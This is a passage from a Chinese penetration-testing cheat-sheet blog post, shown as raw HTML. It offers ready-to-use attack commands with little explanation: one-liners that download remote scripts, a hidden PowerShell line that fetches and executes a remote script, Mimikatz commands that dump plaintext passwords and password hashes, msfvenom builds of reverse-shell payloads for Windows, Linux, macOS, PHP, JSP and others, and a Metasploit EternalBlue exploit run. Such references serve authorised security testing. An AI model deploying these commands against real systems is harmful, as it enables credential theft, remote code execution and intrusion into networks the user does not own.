<h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python2 -c <span class="string">"import urllib2;u=urllib2.urlopen('http://192.168.1.2/1.hta');f=open('c:\\temp\\win.hta','w');f.write(u.read());f.close"</span></span><br><span class="line">python3 -c <span class="string">"import urllib.request;u=urllib.request.urlopen('http://192.168.1.2/1.hta');f=open('c:\\temp\\win.hta','w');f.write(u.read().decode('utf-8'))"</span></span><br></pre></td></tr></table></figure></div>

<h3 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -e <span class="string">'require "net/http";Net::HTTP.start("192.168.1.227") &#123; [http]r=http.get("/1.sh");open("/root/x.sh","wb") &#123;[file]file.write(r.body)&#125;&#125;'</span></span><br></pre></td></tr></table></figure></div>

<h3 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -MLWP::Simple -e <span class="string">'getstore ("http://192.168.1.2/1.sh", "1.sh")'</span></span><br></pre></td></tr></table></figure></div>

<h3 id="Powershell加载远程脚本"><a href="#Powershell加载远程脚本" class="headerlink" title="Powershell加载远程脚本"></a>Powershell加载远程脚本</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">powershell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="literal">-nop</span> <span class="literal">-w</span> <span class="keyword">hidden</span> <span class="literal">-exec</span> bypass <span class="literal">-c</span> <span class="string">"IEX (New-Object New.WebClient).DownloadString('http://192.168.1.2/shell.ps1');shell.ps1"</span>;</span><br></pre></td></tr></table></figure></div>



<h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><h3 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h3><h3 id="启动mimikatz"><a href="#启动mimikatz" class="headerlink" title="启动mimikatz"></a>启动mimikatz</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">powershell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe</span><br><span class="line"><span class="comment"># privilege::debug</span></span><br><span class="line"><span class="comment"># log c:\temp\mimikatz.log</span></span><br></pre></td></tr></table></figure></div>

<h3 id="获取登录账号的明文密码和Hash值"><a href="#获取登录账号的明文密码和Hash值" class="headerlink" title="获取登录账号的明文密码和Hash值"></a>获取登录账号的明文密码和Hash值</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">powershell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sekurlsa::logonpasswords</span></span><br></pre></td></tr></table></figure></div>

<h3 id="备份注册表中的SYSTTEM-amp-SAM-hive"><a href="#备份注册表中的SYSTTEM-amp-SAM-hive" class="headerlink" title="备份注册表中的SYSTTEM &amp; SAM hive"></a>备份注册表中的SYSTTEM &amp; SAM hive</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">powershell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; reg save HKLM\SYSTEM system.hiv</span><br><span class="line">C:\&gt; reg save HKLM\SAM sam.hiv</span><br></pre></td></tr></table></figure></div>

<h3 id="mimikatz获取hashs"><a href="#mimikatz获取hashs" class="headerlink" title="mimikatz获取hashs"></a>mimikatz获取hashs</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">powershell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># lsadump::sam /system:system.hiv /sam:sam.hiv</span></span><br></pre></td></tr></table></figure></div>

<h3 id="读取从lsass进程中保存文件里的明文密码"><a href="#读取从lsass进程中保存文件里的明文密码" class="headerlink" title="读取从lsass进程中保存文件里的明文密码"></a>读取从lsass进程中保存文件里的明文密码</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">powershell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sekurlsa::minidump lsass.dump</span></span><br></pre></td></tr></table></figure></div>



<h2 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h2><h3 id="基础扫描"><a href="#基础扫描" class="headerlink" title="基础扫描"></a>基础扫描</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -T4 192.168.1.1</span><br></pre></td></tr></table></figure></div>

<h3 id="存活主机探测"><a href="#存活主机探测" class="headerlink" title="存活主机探测"></a>存活主机探测</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.1.1/24</span><br></pre></td></tr></table></figure></div>

<h3 id="全端口扫描"><a href="#全端口扫描" class="headerlink" title="全端口扫描"></a>全端口扫描</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -v -T4 -Pm -p- 192.168.1.1</span><br></pre></td></tr></table></figure></div>

<h3 id="系统扫描"><a href="#系统扫描" class="headerlink" title="系统扫描"></a>系统扫描</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -O -T4 -Pn -oG OSDetect 192.168.1.1</span><br></pre></td></tr></table></figure></div>

<h3 id="服务版本检测"><a href="#服务版本检测" class="headerlink" title="服务版本检测"></a>服务版本检测</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -T4 -Pn -oG ServiceDetect 192.168.1.1</span><br></pre></td></tr></table></figure></div>

<h3 id="waf识别"><a href="#waf识别" class="headerlink" title="waf识别"></a>waf识别</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -p80,443 --script http-waf-detect 192.168.1.1</span><br><span class="line">nmap -p80,443 --script http-waf-fingerprint 192.168.1.1</span><br></pre></td></tr></table></figure></div>



<h2 id="Msfvenom"><a href="#Msfvenom" class="headerlink" title="Msfvenom"></a>Msfvenom</h2><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe -o /tmp/shell.exe</span><br></pre></td></tr></table></figure></div>

<h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;Port&gt; -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure></div>

<h3 id="Mac"><a href="#Mac" class="headerlink" title="Mac"></a>Mac</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;Port&gt; -f macho &gt; shell.macho</span><br></pre></td></tr></table></figure></div>

<h3 id="Bash-1"><a href="#Bash-1" class="headerlink" title="Bash"></a>Bash</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_bash LHOST=&lt;IP&gt; LPORT=&lt;Port&gt; -f raw &gt; shell.sh</span><br></pre></td></tr></table></figure></div>

<h3 id="PHP-2"><a href="#PHP-2" class="headerlink" title="PHP"></a>PHP</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;Port&gt; -f raw &gt; shell.php</span><br></pre></td></tr></table></figure></div>

<h3 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;Port&gt; -f raw &gt; shell.jsp</span><br></pre></td></tr></table></figure></div>

<h3 id="WAR"><a href="#WAR" class="headerlink" title="WAR"></a>WAR</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;Port&gt; -f war &gt; shell.war</span><br></pre></td></tr></table></figure></div>

<h3 id="Python-1"><a href="#Python-1" class="headerlink" title="Python"></a>Python</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_python LHOST=&lt;IP&gt; LPORT=&lt;Port&gt; -f raw &gt; shell.py</span><br></pre></td></tr></table></figure></div>

<h3 id="Perl-1"><a href="#Perl-1" class="headerlink" title="Perl"></a>Perl</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_perl LHOST=&lt;IP&gt; LPORT=&lt;Port&gt; -f raw &gt; shell.pl</span><br></pre></td></tr></table></figure></div>

<h3 id="PowerShell"><a href="#PowerShell" class="headerlink" title="PowerShell"></a>PowerShell</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f psh &gt; shell.ps1</span><br></pre></td></tr></table></figure></div>


<h2 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h2><h3 id="msfconsole"><a href="#msfconsole" class="headerlink" title="msfconsole"></a>msfconsole</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; search eternalblue</span><br><span class="line">msf &gt; use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">msf exploit(...) &gt; <span class="built_in">set</span> RHOSTS 192.168.1.1</span><br><span class="line">msf exploit(...) &gt; exploit</span><br></pre></td></tr></table></figure></div>


</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Linkle</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://blog.linkle.top/2021/04/03/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%A4%87%E5%BF%98%E5%BD%95/">https://blog.linkle.top/2021/04/03/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%A4%87%E5%BF%98%E5%BD%95/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://blog.linkle.top">Linkle'Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试    </a></div><div class="post_share"><div class="social-share" data-image="http://pic.linkle.top/img/linkle/20210403133452.png" data-sites="wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js"></script></div></div><nav class="pagination_post" id="pagination"><div class="next-post pull-full"><a href="/2021/03/26/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%88%B6%E4%BD%9C%E7%AE%80%E6%98%93IDS-Part1/"><img class="next_cover lazyload" data-src="http://pic.linkle.top/img/linkle/20210326135909.png" onerror="onerror=null;src='/img/404.jpg'"><div class="label">下一篇</div><div class="next_info"><span>从零开始制作简易IDS-Part1</span></div></a></div></nav><hr><div id="post-comment"><div class="comment_headling"><i class="fa fa-comments fa-fw" aria-hidden="true"></i><span> 评论</span></div><div class="vcomment" id="vcomment"></div><script src="https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js"></script><script>var notify = false == true ? true : false;
var verify = true == true ? true : false;
var GUEST_INFO = ['nick','mail','link'];
var guest_info = 'nick,mail,link'.split(',').filter(function(item){
  return GUEST_INFO.indexOf(item) > -1
});
guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;

window.valine = new Valine({
  el:'#vcomment',
  notify:notify,
  verify:verify,
  appId:'DxpF6wqehhl2c0YY8JICrXkT-gzGzoHsz',
  appKey:'KimQSw8Avwvsab4ST0q1fTdN',
  placeholder:'留下你的足迹吧~',
  avatar:'monsterid',
  guest_info:guest_info,
  pageSize:'10',
  lang:'zh-cn',
  recordIP: true
});</script></div></div></main><footer id="footer" style="background-image: url(http://pic.linkle.top/img/linkle/20210403133452.png)" data-type="photo"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2021 By Linkle</div><div class="framework-info"><span>驱动 </span><a href="http://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 </span><a href="https://github.com/jerryc127/hexo-theme-butterfly" target="_blank" rel="noopener"><span>Butterfly</span></a></div><div class="icp"><a href="http://www.beian.miit.gov.cn/" target="_blank" rel="noopener"><img class="icp-icon" src="/img/icp.png"><span>蜀ICP备19024715号-1</span></a></div></div></footer></div><section class="rightside" id="rightside"><div id="rightside-config-hide"><i class="fa fa-book" id="readmode" title="阅读模式"></i><i class="fa fa-plus" id="font_plus" title="放大字体"></i><i class="fa fa-minus" id="font_minus" title="缩小字体"></i><a class="translate_chn_to_cht" id="translateLink" href="javascript:translatePage();" title="简繁转换" target="_self">繁</a><i class="darkmode fa fa-moon-o" id="darkmode" title="夜间模式"></i></div><div id="rightside-config-show"><div id="rightside_config" title="设置"><i class="fa fa-cog" aria-hidden="true"></i></div><a id="to_comment" href="#post-comment" title="直达评论"><i class="scroll_to_comment fa fa-comments">  </i></a><i class="fa fa-list-ul close" id="mobile-toc-button" title="目录" aria-hidden="true"></i><i class="fa fa-arrow-up" id="go-up" title="回到顶部" aria-hidden="true"></i></div></section><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@latest/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/lazysizes@latest/lazysizes.min.js" async=""></script><script src="https://cdn.jsdelivr.net/gh/jerryc127/butterfly_cdn@2.1.0/js/ClickShowText.js"></script></body></html>